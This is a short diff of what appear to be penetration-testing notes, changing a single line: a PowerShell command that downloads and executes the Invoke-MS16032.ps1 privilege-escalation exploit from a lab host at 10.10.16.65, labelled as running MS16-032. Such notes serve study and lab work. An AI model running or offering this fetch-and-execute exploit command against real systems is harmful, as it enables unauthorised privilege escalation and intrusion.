@@ -23,4 +23,4 @@ Above LDAP:389 connection is encrypted by default in SharpHound, according to bl
 
 
 #powershell invocation of MS16-032 (non-interactive version of the exploit):
-IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-MS16032.ps1')
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-MS16032.ps1')
